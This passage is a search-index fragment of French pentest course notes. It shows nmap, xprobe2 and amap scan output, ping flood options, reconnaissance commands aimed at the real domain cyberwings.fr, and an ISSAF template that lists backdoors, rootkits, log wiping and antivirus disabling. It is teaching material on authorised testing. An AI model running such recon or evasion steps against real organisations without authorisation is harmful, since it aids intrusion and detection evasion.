scanme.nmap.org (not scanned): 2600:3c01::f03c:91ff:fe18:bb2f PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 8.54 seconds sudo nmap -sV -p 31337 scanme.nmap.org Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-15 08:08 EDT Nmap scan report for scanme.nmap.org (45.33.32.156) Host is up (0.050s latency). Other addresses for scanme.nmap.org (not scanned): 2600:3c01::f03c:91ff:fe18:bb2f PORT STATE SERVICE VERSION 31337/tcp open tcpwrapped Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 2.64 seconds => tcp redirig\u00e9 vers un autre port de la machine, pas r\u00e9ussis \u00e0 trouver le service sudo nmap -sV scanme.nmap.org Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-15 08:15 EDT Nmap scan report for scanme.nmap.org (45.33.32.156) Host is up (0.19s latency). Other addresses for scanme.nmap.org (not scanned): 2600:3c01::f03c:91ff:fe18:bb2f Not shown: 992 closed ports PORT STATE SERVICE VERSION 21/tcp open tcpwrapped 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) 443/tcp open tcpwrapped 554/tcp open rtsp? 1723/tcp open tcpwrapped 9929/tcp open nping-echo Nping echo 31337/tcp open tcpwrapped Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 116.27 seconds","title":"Fingerprinting des services"},{"location":"methodologie_pentest/cours/#fingerprinting-de-los","text":"sudo nmap -O scanme.nmap.org 21/tcp open ftp 22/tcp open ssh 80/tcp open http 443/tcp open https 554/tcp open rtsp 1723/tcp open pptp 9929/tcp open nping-echo 31337/tcp open Elite Aggressive OS guesses: Actiontec MI424WR-GEN3I WAP (93%), DD-WRT v24-sp2 (Linux 2.4.37) (92%), Linux 3.2 (91%), Linux 4.4 (90%), Microsoft Windows XP SP3 (90%), Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012 (90%), BlueArc Titan 2100 NAS device (90%), FireBrick FB2700 firewall (87%), IBM BladeCenter management module, IBM System Storage TS3100/TS3200 Express Model tape library, or HP StorageWorks MSL2024 tape library (87%), Pirelli DP-10 VoIP phone (87%) No exact OS matches for host (test conditions non-ideal). Network Distance: 26 hops LINUX , nmap se base sur le payload des r\u00e9ponses pour d\u00e9terminer l'OS, la longueur, le temps de r\u00e9ponse, le contenu varies d'un OS \u00e0 un autre. 26 sauts traceroute scanme.nmap.org traceroute to 45.33.32.156 (45.33.32.156), 30 hops max, 60 byte packets 1 172.16.66.2 (172.16.66.2) 0.389 ms 0.239 ms 0.439 ms 2 _gateway (192.168.43.1) 5.278 ms 5.074 ms 4.940 ms 3 10.125.160.5 (10.125.160.5) 23.847 ms 26.652 ms 32.521 ms 4 10.125.161.82 (10.125.161.82) 32.444 ms 32.283 ms 32.993 ms 5 10.162.36.50 (10.162.36.50) 32.804 ms 32.634 ms 32.468 ms 6 89.89.101.10 (89.89.101.10) 32.302 ms 34.489 ms 37.574 ms 7 62.34.2.30 (62.34.2.30) 37.416 ms 30.329 ms 30.235 ms 8 62.34.2.60 (62.34.2.60) 31.569 ms 35.021 ms 34.954 ms 9 212.194.170.253 (212.194.170.253) 45.222 ms 45.377 ms 45.090 ms 10 be4887.agr21.mrs01.atlas.cogentco.com (149.14.126.217) 56.194 ms 56.134 ms 56.074 ms 11 be2346.ccr22.mrs01.atlas.cogentco.com (154.54.38.173) 56.730 ms 55.947 ms 39.609 ms 12 be3092.ccr41.par01.atlas.cogentco.com (130.117.49.153) 42.653 ms be3093.ccr42.par01.atlas.cogentco.com (130.117.50.165) 42.448 ms be3092.ccr41.par01.atlas.cogentco.com (130.117.49.153) 39.135 ms 13 be12489.ccr42.lon13.atlas.cogentco.com (154.54.57.69) 48.364 ms be12497.ccr41.lon13.atlas.cogentco.com (154.54.56.129) 53.034 ms 53.193 ms 14 be2099.ccr31.bos01.atlas.cogentco.com (154.54.82.34) 116.338 ms be2101.ccr32.bos01.atlas.cogentco.com (154.54.82.38) 116.285 ms 116.226 ms 15 be3600.ccr22.alb02.atlas.cogentco.com (154.54.0.221) 118.722 ms 118.305 ms 118.567 ms 16 be2878.ccr21.cle04.atlas.cogentco.com (154.54.26.129) 129.611 ms 129.612 ms 129.562 ms 17 be2718.ccr42.ord01.atlas.cogentco.com (154.54.7.129) 186.580 ms 186.470 ms 186.410 ms 18 be2831.ccr21.mci01.atlas.cogentco.com (154.54.42.165) 152.033 ms 156.927 ms be2832.ccr22.mci01.atlas.cogentco.com (154.54.44.169) 156.765 ms 19 be3035.ccr21.den01.atlas.cogentco.com (154.54.5.89) 180.882 ms be3036.ccr22.den01.atlas.cogentco.com (154.54.31.89) 151.750 ms be3035.ccr21.den01.atlas.cogentco.com (154.54.5.89) 161.721 ms 20 be3038.ccr32.slc01.atlas.cogentco.com (154.54.42.97) 168.204 ms 172.076 ms 171.969 ms 21 be3110.ccr22.sfo01.atlas.cogentco.com (154.54.44.141) 189.691 ms be3109.ccr21.sfo01.atlas.cogentco.com (154.54.44.137) 185.893 ms be3110.ccr22.sfo01.atlas.cogentco.com (154.54.44.141) 189.248 ms 22 be3178.ccr21.sjc01.atlas.cogentco.com (154.54.43.70) 189.099 ms 179.455 ms 184.264 ms 23 be2063.rcr21.b001848-1.sjc01.atlas.cogentco.com (154.54.1.162) 183.170 ms be2095.rcr21.b001848-1.sjc01.atlas.cogentco.com (154.54.3.138) 187.045 ms 186.965 ms 24 38.142.11.154 (38.142.11.154) 188.374 ms 186.812 ms 178.271 ms 25 173.230.159.65 (173.230.159.65) 189.209 ms 189.095 ms 192.352 ms 26 scanme.nmap.org (45.33.32.156) 188.726 ms 176.661 ms 182.252 ms Il est possible d'avoir des * * \u00e0 la place, c'est normal => on rentre dans des routeurs priv\u00e9s avec des ACL.","title":"Fingerprinting de l'OS"},{"location":"methodologie_pentest/cours/#xprobe","text":"xprobe2 scanme.nmap.org sudo xprobe2 scanme.nmap.org Xprobe2 v.0.3 Copyright (c) 2002-2005 fyodor@o0o.nu, ofir@sys-security.com, meder@o0o.nu [+] Target is scanme.nmap.org [+] Loading modules. [+] Following modules are loaded: [x] [1] ping:icmp_ping - ICMP echo discovery module [x] [2] ping:tcp_ping - TCP-based ping discovery module [x] [3] ping:udp_ping - UDP-based ping discovery module [x] [4] infogather:ttl_calc - TCP and UDP based TTL distance calculation [x] [5] infogather:portscan - TCP and UDP PortScanner [x] [6] fingerprint:icmp_echo - ICMP Echo request fingerprinting module [x] [7] fingerprint:icmp_tstamp - ICMP Timestamp request fingerprinting module [x] [8] fingerprint:icmp_amask - ICMP Address mask request fingerprinting module [x] [9] fingerprint:icmp_port_unreach - ICMP port unreachable fingerprinting module [x] [10] fingerprint:tcp_hshake - TCP Handshake fingerprinting module [x] [11] fingerprint:tcp_rst - TCP RST fingerprinting module [x] [12] fingerprint:smb - SMB fingerprinting module [x] [13] fingerprint:snmp - SNMPv2c fingerprinting module [+] 13 modules registered [+] Initializing scan engine [+] Running scan engine [-] ping:tcp_ping module: no closed/open TCP ports known on 45.33.32.156. Module test failed [-] ping:udp_ping module: no closed/open UDP ports known on 45.33.32.156. Module test failed [-] No distance calculation. 45.33.32.156 appears to be dead or no ports known [+] Host: 45.33.32.156 is up (Guess probability: 50%) [+] Target: 45.33.32.156 is alive. Round-Trip Time: 0.50697 sec [+] Selected safe Round-Trip Time value is: 1.01394 sec [-] fingerprint:tcp_hshake Module execution aborted (no open TCP ports known) [-] fingerprint:smb need either TCP port 139 or 445 to run [-] fingerprint:snmp: need UDP port 161 open [+] Primary guess: [+] Host 45.33.32.156 Running OS: \ufffdz\ufffd\ufffdV (Guess probability: 89%) [+] Other guesses: [+] Host 45.33.32.156 Running OS: \ufffdz\ufffd\ufffdV (Guess probability: 89%) [+] Host 45.33.32.156 Running OS: \ufffdz\ufffd\ufffdV (Guess probability: 89%) [+] Host 45.33.32.156 Running OS: \ufffdz\ufffd\ufffdV (Guess probability: 89%) [+] Host 45.33.32.156 Running OS: (Guess probability: 89%) [+] Host 45.33.32.156 Running OS: \ufffd\ufffd\ufffd\ufffdV (Guess probability: 89%) [+] Host 45.33.32.156 Running OS: \ufffdz\ufffd\ufffdV (Guess probability: 89%) [+] Host 45.33.32.156 Running OS: \ufffdz\ufffd\ufffdV (Guess probability: 89%) [+] Host 45.33.32.156 Running OS: (Guess probability: 89%) [+] Host 45.33.32.156 Running OS: \ufffd\ufffd\ufffd\ufffdV (Guess probability: 89%) [+] Cleaning up scan engine [+] Modules deinitialized [+] Execution completed.","title":"xprobe"},{"location":"methodologie_pentest/cours/#pourquoi-il-ne-faut-jamais-utiliser-nmap-dans-une-grosse-structure","text":"sudo nmap --packet-trace -p 80 -sT scanme.nmap.org Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-15 09:22 EDT SENT (0.0790s) ICMP [172.16.66.131 > 45.33.32.156 Echo request (type=8/code=0) id=40162 seq=0] IP [ttl=42 id=29061 iplen=28 ] SENT (0.0791s) TCP 172.16.66.131:47724 > 45.33.32.156:443 S ttl=41 id=33834 iplen=44 seq=821924815 win=1024 <mss 1460> SENT (0.0792s) TCP 172.16.66.131:47724 > 45.33.32.156:80 A ttl=41 id=57855 iplen=40 seq=0 win=1024 SENT (0.0793s) ICMP [172.16.66.131 > 45.33.32.156 Timestamp request (type=13/code=0) id=27588 seq=0 orig=0 recv=0 trans=0] IP [ttl=49 id=54644 iplen=40 ] RCVD (0.0793s) TCP 45.33.32.156:80 > 172.16.66.131:47724 R ttl=128 id=8773 iplen=40 seq=821924815 win=32767 NSOCK INFO [0.1220s] nsock_iod_new2(): nsock_iod_new (IOD #1) NSOCK INFO [0.1220s] nsock_connect_udp(): UDP connection requested to 172.16.66.2:53 (IOD #1) EID 8 NSOCK INFO [0.1230s] nsock_read(): Read request from IOD #1 [172.16.66.2:53] (timeout: -1ms) EID 18 NSOCK INFO [0.1230s] nsock_write(): Write request for 43 bytes to IOD #1 EID 27 [172.16.66.2:53] NSOCK INFO [0.1230s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 8 [172.16.66.2:53] NSOCK INFO [0.1230s] nsock_trace_handler_callback(): Callback: WRITE SUCCESS for EID 27 [172.16.66.2:53] NSOCK INFO [0.1250s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 18 [172.16.66.2:53] (72 bytes): .............156.32.33.45.in-addr.arpa..................scanme.nmap.org. NSOCK INFO [0.1250s] nsock_read(): Read request from IOD #1 [172.16.66.2:53] (timeout: -1ms) EID 34 NSOCK INFO [0.1250s] nsock_iod_delete(): nsock_iod_delete (IOD #1) NSOCK INFO [0.1250s] nevent_delete(): nevent_delete on event #34 (type READ) CONN (0.1261s) TCP localhost > 45.33.32.156:80 => Operation now in progress CONN (0.1572s) TCP localhost > 45.33.32.156:80 => Connected Nmap scan report for scanme.nmap.org (45.33.32.156) Host is up (0.0041s latency). Other addresses for scanme.nmap.org (not scanned): 2600:3c01::f03c:91ff:fe18:bb2f PORT STATE SERVICE 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 0.16 seconds On voit 4 contr\u00f4les pour voir si l'h\u00f4te est en vie: ping SYN ACK (envois un SYN et un ACK directement sans attendre le SYNACK. Les deux avec des num\u00e9ros de s\u00e9quences al\u00e9atoires Le serveur r\u00e9pond par un RA (reset ack) timestamp request => c'est l'empreinte de nmap !","title":"Pourquoi il ne faut jamais utiliser nmap dans une grosse structure ?"},{"location":"methodologie_pentest/cours/#conclusion","text":"Quand on utilise nmap il y a une empreinte, tous les par feu (actifs, \u00e0 jour, g\u00e9r\u00e9) le savent et vont gueuller. => Il faut suprimer l'empreinte depuis le code source et le recompiler. NMAP est un outil puissant mais facile \u00e0 d\u00e9tecter","title":"Conclusion"},{"location":"methodologie_pentest/cours/#autres-outils","text":"","title":"Autres outils"},{"location":"methodologie_pentest/cours/#amap","text":"Amap est un concurent de nmap mais sans empreinte, seulement il est moins puissant. amap scanme.nmap.org 80 amap v5.4 (www.thc.org/thc-amap) started at 2020-10-15 09:35:35 - APPLICATION MAPPING mode Protocol on 45.33.32.156:80/tcp matches http Protocol on 45.33.32.156:80/tcp matches http-apache-2 Unidentified ports: none. amap v5.4 finished at 2020-10-15 09:35:41 amap scanme.nmap.org 31337 amap v5.4 (www.thc.org/thc-amap) started at 2020-10-15 09:37:26 - APPLICATION MAPPING mode Unidentified ports: 45.33.32.156:31337/tcp (total 1). amap v5.4 finished at 2020-10-15 09:37:33 amap scanme.nmap.org 29 amap v5.4 (www.thc.org/thc-amap) started at 2020-10-15 09:37:26 - APPLICATION MAPPING mode Unidentified ports: 45.33.32.156:31337/tcp (total 1). amap v5.4 finished at 2020-10-15 09:37:33 Peut renvoyer les donn\u00e9es en hexa si il identifie pas","title":"Amap"},{"location":"methodologie_pentest/cours/#ping","text":"ping 8.8.8.8 Envoyer x ping ping -c 6 8.8.8.8 Taille octet d'un ping ping -s 2000 8.8.8.8 flood => envoyer autant de ping que la carte et le reseau peut ping -f 2000 8.8.8.8 Ne pas faire dans un r\u00e9seau surveiller mais dans un pourrie sur un serveur, permet de savoir il est facilement dans les choux, sature vite. intervale en seconde ping -i 15 8.8.8.8 burst : envoie XX pings \u00e0 balle puis ping normal ping -l 50 8.8.8.8 => permet de bypass les par feu tout en sachant si un serveur est pourrie, le par feu va s'en foutre de 30 ping rapide","title":"ping"},{"location":"methodologie_pentest/cours/#tcptraceroute","text":"sudo tcptraceroute 8.8.8.8","title":"tcptraceroute"},{"location":"methodologie_pentest/cours/#active-information-gathering-via-letre-humain","text":"sociel-engineer.org manuel de l'arm\u00e9e : FM2-223 - Alertness => \u00eatre \u00e0 l'alert de chaque d\u00e9tails (plissage de front => defensive) etc - Patience / tact - credibilit\u00e9 - Objectivit\u00e9 - Adaptabilit\u00e9 - Pers\u00e9v\u00e9rences Elements Terre => etat \u00e9motionnel stable : difficile \u00e0 \u00e9nerver / aime pas le changement / paresse Eau => Changement rapide \u00e9tat emmotionnel : Difficile \u00e0 cerner et contr\u00f4ler / facilement en col\u00e8re Feu => Contr\u00f4le \u00e9motionnel : cagressif, dominant / ego, puissance => faut faire peur pour dominer Vent => Intelligence emmotionelle : ampathie, sensible / b\u00e9n\u00e9volat / aime aider / manifeste geste amour => sympathique N\u00e9ant => Cr\u00e9activit\u00e9 / diriger son \u00e9nergie \u00e0 r\u00e9veler l'\u00e9l\u00e9ment des autres => vanit\u00e9, ego classer dans les cat\u00e9gories : 1) vous camarade ? 2) vous profs ? 3) Vous ?","title":"Active information gathering - via l'\u00eatre humain"},{"location":"methodologie_pentest/cyberwings/","text":"Collect email theharvester -d cyberwings.fr -b google => found 3 mail address Tous les navigateurs Need to configure API key theharvester -d cyberwings.fr -b all recherches google emplois cyberwings IRC cyberwings torrent => CV DNS whois cyberwings.fr dnsenum cyberwings.fr Wordlist dnsenum google.com -f /usr/share/dirb/wordlist/small.txt DNS bloqu\u00e9 ? dnsbl.info Checker mail serveur nc -vv mx2.ovh.net 25 VRFY t220 mx2.ovh.net in41 502 5.5.1 VRFY command is disabled transfert de zone DNS digdig axfr @213.251.188.133 cyberwings.fr Failed Aspirer le site httrack cyberwings.fr","title":"Collect email"},{"location":"methodologie_pentest/cyberwings/#collect-email","text":"theharvester -d cyberwings.fr -b google => found 3 mail address","title":"Collect email"},{"location":"methodologie_pentest/cyberwings/#tous-les-navigateurs","text":"Need to configure API key theharvester -d cyberwings.fr -b all","title":"Tous les navigateurs"},{"location":"methodologie_pentest/cyberwings/#recherches-google","text":"emplois cyberwings IRC cyberwings torrent => CV","title":"recherches google"},{"location":"methodologie_pentest/cyberwings/#dns","text":"whois cyberwings.fr dnsenum cyberwings.fr","title":"DNS"},{"location":"methodologie_pentest/cyberwings/#wordlist","text":"dnsenum google.com -f /usr/share/dirb/wordlist/small.txt","title":"Wordlist"},{"location":"methodologie_pentest/cyberwings/#dns-bloque","text":"dnsbl.info","title":"DNS bloqu\u00e9 ?"},{"location":"methodologie_pentest/cyberwings/#checker-mail-serveur","text":"nc -vv mx2.ovh.net 25 VRFY t220 mx2.ovh.net in41 502 5.5.1 VRFY command is disabled","title":"Checker mail serveur"},{"location":"methodologie_pentest/cyberwings/#transfert-de-zone-dns","text":"digdig axfr @213.251.188.133 cyberwings.fr Failed","title":"transfert de zone DNS"},{"location":"methodologie_pentest/cyberwings/#aspirer-le-site","text":"httrack cyberwings.fr","title":"Aspirer le site"},{"location":"methodologie_pentest/methodologie_pentest/","text":"M\u00e9thodologie de pentest Quelques standard, framework de pentest OSSTM PTES OTG ISSAF => \u00e0 savoir par coeur - Compatible Cyber Kill Chain (CKC) https://untrustednetwork.net/files/issaf0.2.1.pdf voir dans classroom ISSAF Divis\u00e9 en 3 phases Planning & preparation Assessment Reporting, Cleanup (prendre des notes !), (Destroy artifacts) Je dois imp\u00e9rativement trouver les employ\u00e9es, se renseigner sur tous les emplyo\u00e9s de l'entreprise. On va chercher : * nom / prenom / Telehpone/ fonction / place dans l'organigramme. Side channel attack : Attaquer par un tiers au lieu de taper directement la cible. les investissements les solutions anti-spams (maybe CVE) les investisseurs (ceux qui ont la majorit\u00e9 des actions), si d\u00e9fonce l'investisseur (saint graal). Que fait l'entreprise ? les services ? http ? ftp ? mails ? profile linkedin ? => shodan Etape 2 - Network mapping On rentre dans la partie active Tenter un fingerprint Eviter de lancer nmap => grill\u00e9 direct c'est connu boloss Trouver les \u00e9quipements de bordure, aux alentours Identifier les r\u00e9seaux les plus importants Etape 3 - Vulnerability assessment On a trouv\u00e9 du HTTPS, par empreinte c'est du vieux apache. On met un indice de ocnfiance devant (on a pas tenter la CVE on a aucune garantie que cela va fonctionner) /!\\ Attention, NMAP peut renvoyer des faux positifs, il est bon de tenter de faire une autre empreinte avec un autre outil /!\\ Il peut \u00eatre cool de monter un lab similaire en local pour reproduire l'infra et avoir de meilleurs chances de r\u00e9ussir. Etape 4/5 Exploitation, Gaining access and escalation On prend la main sur la machine puis on cherche \u00e0 \u00e9lever les droits. Casser des mots de passe n'est jamais vraiment la bonne solution, chercher ce qu'aime l'admin, un pattern, etc. seclist on github => Repo de wordliste \u00e0 th\u00e8me. https://github.com/danielmiessler/SecLists Les mots de passe par d\u00e9faut, des routeurs/switch/etc qui ont un bouton RESET. Etape 6 - Enumerating further hashdump Recuper les hash de tous les mots de passes, on fait du mandling en tache de fond en esperant trouver quelque chose. Si python install\u00e9, on peut snifer le r\u00e9seau etc Regarder dans les cookies => passwords / token Etape 9 - Covering tracks Effacer toutes les traces de notre passage. Bien prendre des notes de ce qu'on fait (malware, backdoor, etc). Eviter les forensics de nous retrouver ! Pr\u00e9paration \u00e0 un audit Tout d'abord il faut rencontrer le client pour voir queqlues points : Temps \u00e0 consacrer Cible \u00e0 pentest Le contenu \u00e0 auditer (ce qu'il ne faut pas toucher) Contact d'urgence (si on tombe la prod il faut tout de suite pr\u00e9venir) / et vice-versa si le pentest ralentit trop la prod D\u00e9finir une date de d\u00e9but La m\u00e9thode utilis\u00e9e doit \u00eatre communiqu\u00e9 au client, la m\u00e9thodologie (ISSAF/OTG/etc) Bien d\u00e9finir dans le contrat ce qui peut-\u00eatre fait ou non (crocheter les serrures secu physique ? / ing\u00e9ni\u00e9rie sociale ?) Audit de nuit (place parking, guardien, etc) Avocat Il est fortement conseill\u00e9 de faire appel \u00e0 un avocat pour un contrat type afin de s'assurer de l'aspect l\u00e9gal. Communiquer Avoir un contact au seins de l'enterprise pour le garder informer des nouveaut\u00e9s. Conseiller Pour chaque faille trouv\u00e9, il faut conseiller sur \"comment s'en prot\u00e9ger ?\" au client, les bonnes pratiques de s\u00e9curit\u00e9s. Tout \u00e9num\u00e9rer ce qu'on fait, presque faire un tuto de comment on a fait. Netoyer Enfin, n\u00e9toyer (sauf si le client dit non), remettre tout comme avant. (ex :snapshot).","title":"M\u00e9thodologie de pentest"},{"location":"methodologie_pentest/methodologie_pentest/#methodologie-de-pentest","text":"","title":"M\u00e9thodologie de pentest"},{"location":"methodologie_pentest/methodologie_pentest/#quelques-standard-framework-de-pentest","text":"OSSTM PTES OTG ISSAF => \u00e0 savoir par coeur - Compatible Cyber Kill Chain (CKC) https://untrustednetwork.net/files/issaf0.2.1.pdf voir dans classroom","title":"Quelques standard, framework de pentest"},{"location":"methodologie_pentest/methodologie_pentest/#issaf","text":"Divis\u00e9 en 3 phases Planning & preparation Assessment Reporting, Cleanup (prendre des notes !), (Destroy artifacts) Je dois imp\u00e9rativement trouver les employ\u00e9es, se renseigner sur tous les emplyo\u00e9s de l'entreprise. On va chercher : * nom / prenom / Telehpone/ fonction / place dans l'organigramme. Side channel attack : Attaquer par un tiers au lieu de taper directement la cible. les investissements les solutions anti-spams (maybe CVE) les investisseurs (ceux qui ont la majorit\u00e9 des actions), si d\u00e9fonce l'investisseur (saint graal). Que fait l'entreprise ? les services ? http ? ftp ? mails ? profile linkedin ? => shodan","title":"ISSAF"},{"location":"methodologie_pentest/methodologie_pentest/#etape-2-network-mapping","text":"On rentre dans la partie active Tenter un fingerprint Eviter de lancer nmap => grill\u00e9 direct c'est connu boloss Trouver les \u00e9quipements de bordure, aux alentours Identifier les r\u00e9seaux les plus importants","title":"Etape 2 - Network mapping"},{"location":"methodologie_pentest/methodologie_pentest/#etape-3-vulnerability-assessment","text":"On a trouv\u00e9 du HTTPS, par empreinte c'est du vieux apache. On met un indice de ocnfiance devant (on a pas tenter la CVE on a aucune garantie que cela va fonctionner) /!\\ Attention, NMAP peut renvoyer des faux positifs, il est bon de tenter de faire une autre empreinte avec un autre outil /!\\ Il peut \u00eatre cool de monter un lab similaire en local pour reproduire l'infra et avoir de meilleurs chances de r\u00e9ussir.","title":"Etape 3 - Vulnerability assessment"},{"location":"methodologie_pentest/methodologie_pentest/#etape-45","text":"Exploitation, Gaining access and escalation On prend la main sur la machine puis on cherche \u00e0 \u00e9lever les droits. Casser des mots de passe n'est jamais vraiment la bonne solution, chercher ce qu'aime l'admin, un pattern, etc. seclist on github => Repo de wordliste \u00e0 th\u00e8me. https://github.com/danielmiessler/SecLists Les mots de passe par d\u00e9faut, des routeurs/switch/etc qui ont un bouton RESET.","title":"Etape 4/5"},{"location":"methodologie_pentest/methodologie_pentest/#etape-6-enumerating-further","text":"hashdump Recuper les hash de tous les mots de passes, on fait du mandling en tache de fond en esperant trouver quelque chose. Si python install\u00e9, on peut snifer le r\u00e9seau etc Regarder dans les cookies => passwords / token","title":"Etape 6 - Enumerating further"},{"location":"methodologie_pentest/methodologie_pentest/#etape-9-covering-tracks","text":"Effacer toutes les traces de notre passage. Bien prendre des notes de ce qu'on fait (malware, backdoor, etc). Eviter les forensics de nous retrouver !","title":"Etape 9 - Covering tracks"},{"location":"methodologie_pentest/methodologie_pentest/#preparation-a-un-audit","text":"Tout d'abord il faut rencontrer le client pour voir queqlues points : Temps \u00e0 consacrer Cible \u00e0 pentest Le contenu \u00e0 auditer (ce qu'il ne faut pas toucher) Contact d'urgence (si on tombe la prod il faut tout de suite pr\u00e9venir) / et vice-versa si le pentest ralentit trop la prod D\u00e9finir une date de d\u00e9but La m\u00e9thode utilis\u00e9e doit \u00eatre communiqu\u00e9 au client, la m\u00e9thodologie (ISSAF/OTG/etc) Bien d\u00e9finir dans le contrat ce qui peut-\u00eatre fait ou non (crocheter les serrures secu physique ? / ing\u00e9ni\u00e9rie sociale ?) Audit de nuit (place parking, guardien, etc)","title":"Pr\u00e9paration \u00e0 un audit"},{"location":"methodologie_pentest/methodologie_pentest/#avocat","text":"Il est fortement conseill\u00e9 de faire appel \u00e0 un avocat pour un contrat type afin de s'assurer de l'aspect l\u00e9gal.","title":"Avocat"},{"location":"methodologie_pentest/methodologie_pentest/#communiquer","text":"Avoir un contact au seins de l'enterprise pour le garder informer des nouveaut\u00e9s.","title":"Communiquer"},{"location":"methodologie_pentest/methodologie_pentest/#conseiller","text":"Pour chaque faille trouv\u00e9, il faut conseiller sur \"comment s'en prot\u00e9ger ?\" au client, les bonnes pratiques de s\u00e9curit\u00e9s. Tout \u00e9num\u00e9rer ce qu'on fait, presque faire un tuto de comment on a fait.","title":"Conseiller"},{"location":"methodologie_pentest/methodologie_pentest/#netoyer","text":"Enfin, n\u00e9toyer (sauf si le client dit non), remettre tout comme avant. (ex :snapshot).","title":"Netoyer"},{"location":"methodologie_pentest/ISSAF/DE-ICE-110/","text":"DE-ICE-110 - Pentest Auditeur Julien Faou","title":"DE-ICE-110 - Pentest"},{"location":"methodologie_pentest/ISSAF/DE-ICE-110/#de-ice-110-pentest","text":"","title":"DE-ICE-110 - Pentest"},{"location":"methodologie_pentest/ISSAF/DE-ICE-110/#auditeur-julien-faou","text":"","title":"Auditeur Julien Faou"},{"location":"methodologie_pentest/ISSAF/GoldenEye-V1/","text":"","title":"GoldenEye V1"},{"location":"methodologie_pentest/ISSAF/template_ISSAF/","text":"M\u00e9thodologie template - Pentest Auteur : Julien Faou Bas\u00e9 sur l'ISSAF Information gathering Employees (name and number of employees, role, positions and contact details,) Technology partners (technologies used, locations, computing platforms) Business partners (involvement, location, their trust relationship, and so on) Business/financial history, investments, and investor details Web presence (name and number of domains, where they are hosted, etc.) Physical locations (offices, data centers, partners, warehouses) Network topology and -architecture Technologies being implemented on the network E-mails, phone numbers, or any other personal information Company location, product names, and names of senior managers in the company IP block owned Administration and maintenance contact for target domain and IP block Passive information gathering Locate the target Web presence Examine the target using search engines Search Web groups Search employee personal Web sites Search Security & Exchange Commission and finance sites Search uptime statistics sites Search system/network survey sites Search on P2P networks Search on Internet Relay Chat (IRC) Search job databases Search newsgroups (NNTP) Gain information from domain registrar Check for reverse DNS lookup presence Check more DNS information Check Spam database lookup Check to change WHOIS information Active information gathering Technique DNS / WHOIS Non technique Search engine news groups mailing list Network mapping Find live hosts Port and service scanning Perimeter network mapping (router, firewalls) Identifing cirtical services Operating fingerprinting Identifying routes using Management Information Base (MIB) Service fingerprinting Vulnerability identification Identify vulnerable services using service banners Perform vulnerability scan to search for known vulnerabilities. Information regarding known vulnerabilities can be obtained from the vendors\u2019 security announcements, or from public databases such as SecurityFocus, CVE or CERT advisories. Perform false positive and false negative verification (e.g. by correlating vulnerabilities with each other and with previously acquired information) Enumerate discovered vulnerabilities Estimate probable impact (classify vulnerabilities found) Identify attack paths and scenarios for exploitation Penetration Find proof of concept code/tool Develop tools/scripts Test proof of concept code/tool Use proof of concept code against target Verify or disprove the existence of vulnerabilities Gaining access & Privilege escalation Gaining access Gain Least Privilege Discovery of username/password combinations (e.g. dictionary attacks, brute force attacks) Discovery of blank password or default passwords in system accounts Exploit vendor default settings (such as network configuration parameters, passwords and others) Discovery of public services that allow for certain operations within the system (e.g. writing/creating/reading files) Enumerating Further Obtain encrypted passwords for offline cracking (for example by dumping the SAM on Windows systems, or copying /etc/passwd and /etc/shadow from a Linux system) Obtain password (plaintext or encrypted) by using sniffing or other techniques Sniff traffic and analyze it Gather cookies and use them to exploit sessions and for password attacks E-mail address gathering Identifying routes and networks Mapping internal networks Perform steps 1 to 6 again with this system as starting point Compromise remote users / sites Try to get remote access to other networks, sites => Follow again all steps Maintaining access Covert channels Identify Covert Channel Which Can Be Used Select the Best Available Tool for the Covert Channel Methodology - Setup the Covert Channel in the Target Network Test the Covertness of Channel Using Common Detection Technique Backdoors Setting up backdoors Root-Kits Setting up Root-kits Covering tracks Hide files Hide files Clear logs check history Edit log files Defeat integrity checking Look for integrity checking and try to defeat it (file whiti signature, misconfiguration, ...) Defeat anti-virus Disable the AV services Block the central management port Impl IDS FIREWALL ANTIVIRUS p483 linux p607-699 web","title":"M\u00e9thodologie template - Pentest"},{"location":"methodologie_pentest/ISSAF/template_ISSAF/#methodologie-template-pentest","text":"","title":"M\u00e9thodologie template - Pentest"},{"location":"methodologie_pentest/ISSAF/template_ISSAF/#auteur-julien-faou","text":"","title":"Auteur : Julien Faou"},{"location":"methodologie_pentest/ISSAF/template_ISSAF/#base-sur-lissaf","text":"","title":"Bas\u00e9 sur l'ISSAF"},{"location":"methodologie_pentest/ISSAF/template_ISSAF/#information-gathering","text":"Employees (name and number of employees, role, positions and contact details,) Technology partners (technologies used, locations, computing platforms) Business partners (involvement, location, their trust relationship, and so on) Business/financial history, investments, and investor details Web presence (name and number of domains, where they are hosted, etc.) Physical locations (offices, data centers, partners, warehouses) Network topology and -architecture Technologies being implemented on the network E-mails, phone numbers, or any other personal information Company location, product names, and names of senior managers in the company IP block owned Administration and maintenance contact for target domain and IP block","title":"Information gathering"},{"location":"methodologie_pentest/ISSAF/template_ISSAF/#passive-information-gathering","text":"Locate the target Web presence Examine the target using search engines Search Web groups Search employee personal Web sites Search Security & Exchange Commission and finance sites Search uptime statistics sites Search system/network survey sites Search on P2P networks Search on Internet Relay Chat (IRC) Search job databases Search newsgroups (NNTP) Gain information from domain registrar Check for reverse DNS lookup presence Check more DNS information Check Spam database lookup Check to change WHOIS information","title":"Passive information gathering"},{"location":"methodologie_pentest/ISSAF/template_ISSAF/#active-information-gathering","text":"","title":"Active information gathering"},{"location":"methodologie_pentest/ISSAF/template_ISSAF/#technique","text":"DNS / WHOIS","title":"Technique"},{"location":"methodologie_pentest/ISSAF/template_ISSAF/#non-technique","text":"Search engine news groups mailing list","title":"Non technique"},{"location":"methodologie_pentest/ISSAF/template_ISSAF/#network-mapping","text":"Find live hosts Port and service scanning Perimeter network mapping (router, firewalls) Identifing cirtical services Operating fingerprinting Identifying routes using 